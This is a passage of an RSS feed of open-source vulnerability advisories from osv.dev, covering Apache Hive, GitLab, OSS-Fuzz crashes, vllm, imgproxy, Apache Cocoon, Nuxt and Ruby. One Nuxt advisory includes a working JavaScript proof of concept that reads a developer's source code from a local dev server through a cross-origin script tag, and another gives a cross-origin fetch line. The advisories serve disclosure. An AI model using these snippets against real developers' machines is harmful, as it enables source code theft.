                            <b>References:</b> <ul><li>- <a target='_blank' href='https://blog.gypsyengineer.com/en/security/preventing-timing-attacks-with-codeql.html'>https://blog.gypsyengineer.com/en/security/preventing-timing-attacks-with-codeql.html</a></li><li>- <a target='_blank' href='https://cqr.company/web-vulnerabilities/timing-attacks/'>https://cqr.company/web-vulnerabilities/timing-attacks/</a></li><li>- <a target='_blank' href='https://github.com/apache/hive'>https://github.com/apache/hive</a></li><li>- <a target='_blank' href='https://issues.apache.org/jira/browse/HIVE-28030'>https://issues.apache.org/jira/browse/HIVE-28030</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread/0nloywj49nbtlc6l3c6363qvq7o1ztb7'>https://lists.apache.org/thread/0nloywj49nbtlc6l3c6363qvq7o1ztb7</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2025/01/28/3'>http://www.openwall.com/lists/oss-security/2025/01/28/3</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Use of Arrays.equals() in LlapSignerImpl in Apache Hive to compare message signatures allows attacker to forge a valid signature for an arbitrary message byte by byte. The attacker should be an authorized user of the product to perform this attack. Users are recommended to upgrade to version 4.0.0, which fixes this issue.

The problem occurs when an application doesn’t use a constant-time algorithm for validating a signature. The method Arrays.equals() returns false right away when it sees that one of the input’s bytes are different. It means that the comparison time depends on the contents of the arrays. This little thing may allow an attacker to forge a valid signature for an arbitrary message byte by byte. So it might allow malicious users to submit splits&#x2F;work with selected signatures to LLAP without running as a privileged user, potentially leading to DDoS attack.

More details in the reference section.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-11931: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-11931</link>
                    <pubDate>2025-01-28T07:25:07.907Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-11931'>https://osv.dev/vulnerability/BIT-gitlab-2024-11931</a><br>
                            <b>Published:</b> 2025-01-28T07:25:07.907Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/480901'>https://gitlab.com/gitlab-org/gitlab/-/issues/480901</a></li><li>- <a target='_blank' href='https://about.gitlab.com/releases/2025/01/22/patch-release-gitlab-17-8-1-released/https://about.gitlab.com/releases/2025/01/22/patch-release-gitlab-17-8-1-released/'>https://about.gitlab.com/releases/2025/01/22/patch-release-gitlab-17-8-1-released/https://about.gitlab.com/releases/2025/01/22/patch-release-gitlab-17-8-1-released/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions starting from 17.0 prior to 17.6.4, from 17.7 prior to 17.7.3, and from 17.8 prior to 17.8.1. Under certain conditions, it may have been possible for users with developer role to exfiltrate protected CI variables via CI lint.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2025-0314: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2025-0314</link>
                    <pubDate>2025-01-28T07:10:14.614Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2025-0314'>https://osv.dev/vulnerability/BIT-gitlab-2025-0314</a><br>
                            <b>Published:</b> 2025-01-28T07:10:14.614Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/512118'>https://gitlab.com/gitlab-org/gitlab/-/issues/512118</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2922313'>https://hackerone.com/reports/2922313</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions from 17.2 before 17.6.4, 17.7 before 17.7.3, and 17.8 before 17.8.1. Improper rendering of certain file types lead to cross-site scripting.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1427: 0 | <b>Heap-buffer-overflow in extract_mediaip</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1427</link>
                    <pubDate>2025-01-28T00:14:30.487391Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1427'>https://osv.dev/vulnerability/OSV-2024-1427</a><br>
                            <b>Published:</b> 2025-01-28T00:14:30.487391Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391975654'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391975654</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in extract_mediaip</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=391975654

```
Crash type: Heap-buffer-overflow READ 1
Crash state:
extract_mediaip
parse_sdp_session
parse_mixed_content
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-68: 0 | <b>UNKNOWN READ in std::__1::__function::__func&amp;lt;cv::PngDecoder::compose_frame</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-68</link>
                    <pubDate>2025-01-28T00:00:46.845996Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-68'>https://osv.dev/vulnerability/OSV-2025-68</a><br>
                            <b>Published:</b> 2025-01-28T00:00:46.845996Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=392318892'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=392318892</a></li></ul><br>
                            <b>Details:</b> <b>UNKNOWN READ in std::__1::__function::__func&amp;lt;cv::PngDecoder::compose_frame</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=392318892

```
Crash type: UNKNOWN READ
Crash state:
std::__1::__function::__func&amp;lt;cv::PngDecoder::compose_frame
cv::ParallelLoopBodyWrapper::operator
cv::ThreadPool::run
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-rh4j-5rhw-hr54: 7.5 | <b>vllm: Malicious model to RCE by torch.load in hf_model_weights_iterator</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-rh4j-5rhw-hr54</link>
                    <pubDate>2025-01-27T20:50:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-rh4j-5rhw-hr54'>https://osv.dev/vulnerability/GHSA-rh4j-5rhw-hr54</a><br>
                            <b>Published:</b> 2025-01-27T20:50:30Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54'>https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/pull/12366'>https://github.com/vllm-project/vllm/pull/12366</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/commit/d3d6bb13fb62da3234addf6574922a4ec0513d04'>https://github.com/vllm-project/vllm/commit/d3d6bb13fb62da3234addf6574922a4ec0513d04</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm'>https://github.com/vllm-project/vllm</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/releases/tag/v0.7.0'>https://github.com/vllm-project/vllm/releases/tag/v0.7.0</a></li><li>- <a target='_blank' href='https://pytorch.org/docs/stable/generated/torch.load.html'>https://pytorch.org/docs/stable/generated/torch.load.html</a></li></ul><br>
                            <b>Details:</b> <b>vllm: Malicious model to RCE by torch.load in hf_model_weights_iterator</b><br>### Description
The vllm&#x2F;model_executor&#x2F;weight_utils.py implements hf_model_weights_iterator to load the model checkpoint, which is downloaded from huggingface. It use torch.load function and weights_only parameter is default value False. There is a security warning on https:&#x2F;&#x2F;pytorch.org&#x2F;docs&#x2F;stable&#x2F;generated&#x2F;torch.load.html, when torch.load load a malicious pickle data it will execute arbitrary code during unpickling.

### Impact
This vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine who fetch the pretrained repo remotely.

Note that most models now use the safetensors format, which is not vulnerable to this issue.

### References
* https:&#x2F;&#x2F;pytorch.org&#x2F;docs&#x2F;stable&#x2F;generated&#x2F;torch.load.html
* Fix: https:&#x2F;&#x2F;github.com&#x2F;vllm-project&#x2F;vllm&#x2F;pull&#x2F;12366
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j2hp-6m75-v4j4: 5.3 | <b>imgproxy is vulnerable to SSRF against 0.0.0.0</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j2hp-6m75-v4j4</link>
                    <pubDate>2025-01-27T20:50:21Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j2hp-6m75-v4j4'>https://osv.dev/vulnerability/GHSA-j2hp-6m75-v4j4</a><br>
                            <b>Published:</b> 2025-01-27T20:50:21Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/imgproxy/imgproxy/security/advisories/GHSA-j2hp-6m75-v4j4'>https://github.com/imgproxy/imgproxy/security/advisories/GHSA-j2hp-6m75-v4j4</a></li><li>- <a target='_blank' href='https://github.com/imgproxy/imgproxy/commit/3d4fed6842aa8930ec224d0ad75b0079b858e081'>https://github.com/imgproxy/imgproxy/commit/3d4fed6842aa8930ec224d0ad75b0079b858e081</a></li><li>- <a target='_blank' href='https://github.com/imgproxy/imgproxy'>https://github.com/imgproxy/imgproxy</a></li></ul><br>
                            <b>Details:</b> <b>imgproxy is vulnerable to SSRF against 0.0.0.0</b><br>### Summary

Imgproxy does not block the `0.0.0.0` address, even with `IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES` set to false. This can expose services on the local host.

### Details

imgproxy protects against SSRF against a loopback address with the following check ([source](https:&#x2F;&#x2F;github.com&#x2F;imgproxy&#x2F;imgproxy&#x2F;blob&#x2F;0f37d62fd8326a32c213b30dd52e2319770885d8&#x2F;security&#x2F;source.go#L43C1-L47C1)):

```
if !config.AllowLoopbackSourceAddresses &amp;&amp; ip.IsLoopback() {
	return ErrSourceAddressNotAllowed
}
```

This check is insufficient to prevent accessing services on the local host, as services may receive traffic on `0.0.0.0`. Go&#x27;s `IsLoopback` ([source](https:&#x2F;&#x2F;github.com&#x2F;golang&#x2F;go&#x2F;blob&#x2F;40b3c0e58a0ae8dec4684a009bf3806769e0fc41&#x2F;src&#x2F;net&#x2F;ip.go#L126-L131)) strictly follows the definition of loopback IPs beginning with `127`. `0.0.0.0` is not blocked.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-pff9-53m5-qr56: 2.7 | <b>Apache Cocoon vulnerable to Incorrect Usage of Seeds in Pseudo-Random Number Generator</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-pff9-53m5-qr56</link>
                    <pubDate>2025-01-27T15:30:58Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-pff9-53m5-qr56'>https://osv.dev/vulnerability/GHSA-pff9-53m5-qr56</a><br>
                            <b>Published:</b> 2025-01-27T15:30:58Z<br>
                            <b>Severity:</b> 2.7<br>
                            <b>Langs:</b> java<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/apache/cocoon'>https://github.com/apache/cocoon</a></li><li>- <a target='_blank' href='https://github.com/apache/cocoon/blob/32a4e41183ba74351d85060011151b2d58acfc52/blocks/cocoon-forms/cocoon-forms-impl/src/main/java/org/apache/cocoon/forms/formmodel/CaptchaField.java#L70'>https://github.com/apache/cocoon/blob/32a4e41183ba74351d85060011151b2d58acfc52/blocks/cocoon-forms/cocoon-forms-impl/src/main/java/org/apache/cocoon/forms/formmodel/CaptchaField.java#L70</a></li><li>- <a target='_blank' href='https://github.com/apache/cocoon/blob/32a4e41183ba74351d85060011151b2d58acfc52/core/cocoon-sitemap/cocoon-sitemap-impl/src/main/java/org/apache/cocoon/components/flow/ContinuationsManagerImpl.java#L112'>https://github.com/apache/cocoon/blob/32a4e41183ba74351d85060011151b2d58acfc52/core/cocoon-sitemap/cocoon-sitemap-impl/src/main/java/org/apache/cocoon/components/flow/ContinuationsManagerImpl.java#L112</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread/pk86jp5cvn41432op8wv1k8p14mp27nz'>https://lists.apache.org/thread/pk86jp5cvn41432op8wv1k8p14mp27nz</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2025/01/27/3'>http://www.openwall.com/lists/oss-security/2025/01/27/3</a></li></ul><br>
                            <b>Details:</b> <b>Apache Cocoon vulnerable to Incorrect Usage of Seeds in Pseudo-Random Number Generator</b><br>Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG) vulnerability in Apache Cocoon.

This issue affects Apache Cocoon: all versions.

When a continuation is created, it gets a random identifier. Because the random number generator used to generate these identifiers was seeded with the startup time, it may not have been sufficiently unpredictable, and an attacker could use this to guess continuation ids and look up continuations they should not have had access to.

As a mitigation, you may enable the &quot;session-bound-continuations&quot; option to make sure continuations are not shared across sessions.


As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.

NOTE: This vulnerability only affects products that are no longer supported by the maintainer.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-4gf7-ff8x-hq99: 5.3 | <b>Opening a malicious website while running a Nuxt dev server could allow read-only access to code</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-4gf7-ff8x-hq99</link>
                    <pubDate>2025-01-27T11:31:41Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-4gf7-ff8x-hq99'>https://osv.dev/vulnerability/GHSA-4gf7-ff8x-hq99</a><br>
                            <b>Published:</b> 2025-01-27T11:31:41Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99'>https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f'>https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt'>https://github.com/nuxt/nuxt</a></li></ul><br>
                            <b>Details:</b> <b>Opening a malicious website while running a Nuxt dev server could allow read-only access to code</b><br>### Summary
Source code may be stolen during dev when using webpack &#x2F; rspack builder and you open a malicious web site.

### Details
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `&amp;lt;script src=&quot;http:&#x2F;&#x2F;localhost:3000&#x2F;_nuxt&#x2F;app.js&quot;&amp;gt;` in their site and run the script.
By using `Function::toString` against the values in `window.webpackChunknuxt_app`, the attacker can get the source code.

### PoC
1. Create a nuxt project with webpack &#x2F; rspack builder.
1. Run `npm run dev`
1. Open `http:&#x2F;&#x2F;localhost:3000`
1. Run the script below in a web site that has a different origin.
1. You can see the source code output in the document and the devtools console.

```js
const script = document.createElement(&#x27;script&#x27;)
script.src = &#x27;http:&#x2F;&#x2F;localhost:3000&#x2F;_nuxt&#x2F;app.js&#x27;
script.addEventListener(&#x27;load&#x27;, () =&amp;gt; {
  for (const page in window.webpackChunknuxt_app) {
    const moduleList = window.webpackChunknuxt_app[page][1]
    console.log(moduleList)

    for (const key in moduleList) {
      const p = document.createElement(&#x27;p&#x27;)
      const title = document.createElement(&#x27;strong&#x27;)
      title.textContent = key
      const code = document.createElement(&#x27;code&#x27;)
      code.textContent = moduleList[key].toString()
      p.append(title, &#x27;:&#x27;, document.createElement(&#x27;br&#x27;), code)
      document.body.appendChild(p)
    }
  }
})
document.head.appendChild(script)
```

![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;201e39b7-da5c-4359-867f-96c9adfd3c85)
It contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the `sourcesContent` field).

### Impact
Users using webpack &#x2F; rspack builder may get the source code stolen by malicious websites.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2452-6xj8-jh47: 5.3 | <b>Opening a malicious website while running a Nuxt dev server could allow read-only access to code</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2452-6xj8-jh47</link>
                    <pubDate>2025-01-27T11:31:14Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2452-6xj8-jh47'>https://osv.dev/vulnerability/GHSA-2452-6xj8-jh47</a><br>
                            <b>Published:</b> 2025-01-27T11:31:14Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/security/advisories/GHSA-2452-6xj8-jh47'>https://github.com/nuxt/nuxt/security/advisories/GHSA-2452-6xj8-jh47</a></li><li>- <a target='_blank' href='https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6'>https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/pull/23995'>https://github.com/nuxt/nuxt/pull/23995</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f'>https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt'>https://github.com/nuxt/nuxt</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263'>https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39'>https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39</a></li></ul><br>
                            <b>Details:</b> <b>Opening a malicious website while running a Nuxt dev server could allow read-only access to code</b><br>### Summary
Nuxt allows any websites to send any requests to the development server and read the response due to default CORS settings.

### Details
While Vite patched the default CORS settings to fix https:&#x2F;&#x2F;github.com&#x2F;vitejs&#x2F;vite&#x2F;security&#x2F;advisories&#x2F;GHSA-vg6x-rcgg-rjx6, nuxt uses its own CORS handler by default (https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;nuxt&#x2F;pull&#x2F;23995).

https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;nuxt&#x2F;blob&#x2F;7d345c71462d90187fd09c96c7692f306c90def5&#x2F;packages&#x2F;vite&#x2F;src&#x2F;client.ts#L257-L263

That CORS handler sets `Access-Control-Allow-Origin: *`.

&amp;gt; [!IMPORTANT]  
&amp;gt; If on an affected version, it may be possible to opt-out of the default Nuxt CORS handler by configuring `vite.server.cors`.

### PoC
1. Start a dev server in any nuxt project using Vite by `nuxt dev`.
2. Send a fetch request to `http:&#x2F;&#x2F;localhost:3000&#x2F;_nuxt&#x2F;app.vue` (`fetch(&#x27;http:&#x2F;&#x2F;localhost:3000&#x2F;_nuxt&#x2F;app.vue&#x27;)`) from a different origin page.

### Impact
Users with the default server.cors option using Vite builder may get the source code stolen by malicious websites

### Additional Information
`&#x2F;__nuxt_vite_node__&#x2F;manifest` &#x2F; `&#x2F;__nuxt_vite_node__&#x2F;module` also seems to have `Access-Control-Allow-Origin: *`, so it maybe also possible to exploit that handler.
https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;nuxt&#x2F;blob&#x2F;7d345c71462d90187fd09c96c7692f306c90def5&#x2F;packages&#x2F;vite&#x2F;src&#x2F;vite-node.ts#L39
Although I didn&#x27;t find a valid module id.
Note that this handler is probably also vulnerable to DNS rebinding attacks as I didn&#x27;t find any host header checks.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2020-25613: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2020-25613</link>
                    <pubDate>2025-01-27T07:21:20.426Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2020-25613'>https://osv.dev/vulnerability/BIT-ruby-min-2020-25613</a><br>
                            <b>Published:</b> 2025-01-27T07:21:20.426Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ruby/webrick/commit/8946bb38b4d87549f0d99ed73c62c41933f97cc7'>https://github.com/ruby/webrick/commit/8946bb38b4d87549f0d99ed73c62c41933f97cc7</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/965267'>https://hackerone.com/reports/965267</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/04/msg00033.html'>https://lists.debian.org/debian-lts-announce/2023/04/msg00033.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PFP3E7KXXT3H3KA6CBZPUOGA5VPFARRJ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PFP3E7KXXT3H3KA6CBZPUOGA5VPFARRJ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YTZURYROG3FFED3TYCQOBV66BS4K6WOV/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YTZURYROG3FFED3TYCQOBV66BS4K6WOV/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210115-0008/'>https://security.netapp.com/advisory/ntap-20210115-0008/</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2020/09/29/http-request-smuggling-cve-2020-25613/'>https://www.ruby-lang.org/en/news/2020/09/29/http-request-smuggling-cve-2020-25613/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Ruby through 2.5.8, 2.6.x through 2.6.6, and 2.7.x through 2.7.1. WEBrick, a simple HTTP server bundled with Ruby, had not checked the transfer-encoding header value rigorously. An attacker may potentially exploit this issue to bypass a reverse proxy (which also has a poor header check), which may lead to an HTTP Request Smuggling attack.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2020-5247: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2020-5247</link>
                    <pubDate>2025-01-27T07:21:13.232Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2020-5247'>https://osv.dev/vulnerability/BIT-ruby-min-2020-5247</a><br>
                            <b>Published:</b> 2025-01-27T07:21:13.232Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v'>https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/05/msg00034.html'>https://lists.debian.org/debian-lts-announce/2022/05/msg00034.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BMJ3CGZ3DLBJ5WUUKMI5ZFXFJQMXJZIK/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BMJ3CGZ3DLBJ5WUUKMI5ZFXFJQMXJZIK/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DIHVO3CQMU7BZC7FCTSRJ33YDNS3GFPK/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DIHVO3CQMU7BZC7FCTSRJ33YDNS3GFPK/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NJ3LL5F5QADB6LM46GXZETREAKZMQNRD/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NJ3LL5F5QADB6LM46GXZETREAKZMQNRD/</a></li><li>- <a target='_blank' href='https://owasp.org/www-community/attacks/HTTP_Response_Splitting'>https://owasp.org/www-community/attacks/HTTP_Response_Splitting</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254'>https://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In Puma (RubyGem) before 4.3.2 and before 3.12.3, if an application using Puma allows untrusted input in a response header, an attacker can use newline characters (i.e. `CR`, `LF` or`&#x2F;r`, `&#x2F;n`) to end the header and inject malicious content, such as additional headers or an entirely new response body. This vulnerability is known as HTTP Response Splitting. While not an attack in itself, response splitting is a vector for several other attacks, such as cross-site scripting (XSS). This is related to CVE-2019-16254, which fixed this vulnerability for the WEBrick Ruby web server. This has been fixed in versions 4.3.2 and 3.12.3 by checking all headers for line endings and rejecting headers with those characters.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2021-28966: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2021-28966</link>
                    <pubDate>2025-01-27T07:20:58.528Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2021-28966'>https://osv.dev/vulnerability/BIT-ruby-min-2021-28966</a><br>
                            <b>Published:</b> 2025-01-27T07:20:58.528Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1131465'>https://hackerone.com/reports/1131465</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210902-0004/'>https://security.netapp.com/advisory/ntap-20210902-0004/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In Ruby through 3.0 on Windows, a remote attacker can submit a crafted path when a Web application handles a parameter with TmpDir.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2021-31810: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2021-31810</link>
                    <pubDate>2025-01-27T07:20:50.936Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-ruby-min-2021-31810'>https://osv.dev/vulnerability/BIT-ruby-min-2021-31810</a><br>
                            <b>Published:</b> 2025-01-27T07:20:50.936Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1145454'>https://hackerone.com/reports/1145454</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/10/msg00009.html'>https://lists.debian.org/debian-lts-announce/2021/10/msg00009.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/04/msg00033.html'>https://lists.debian.org/debian-lts-announce/2023/04/msg00033.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MWXHK5UUHVSHF7HTHMX6JY3WXDVNIHSL/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MWXHK5UUHVSHF7HTHMX6JY3WXDVNIHSL/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-27'>https://security.gentoo.org/glsa/202401-27</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210917-0001/'>https://security.netapp.com/advisory/ntap-20210917-0001/</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.ruby-lang.org/en/news/2021/07/07/trusting-pasv-responses-in-net-ftp/'>https://www.ruby-lang.org/en/news/2021/07/07/trusting-pasv-responses-in-net-ftp/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Ruby through 2.6.7, 2.7.x through 2.7.3, and 3.x through 3.0.1. A malicious FTP server can use the PASV response to trick Net::FTP into connecting back to a given IP address and port. This potentially makes curl extract information about services that are otherwise private and not disclosed (e.g., the attacker can conduct port scans and service banner extractions).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-ruby-min-2021-32066: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-ruby-min-2021-32066</link>
                    <pubDate>2025-01-27T07:20:44.126Z</pubDate>
                    <description>
                        <![CDATA[
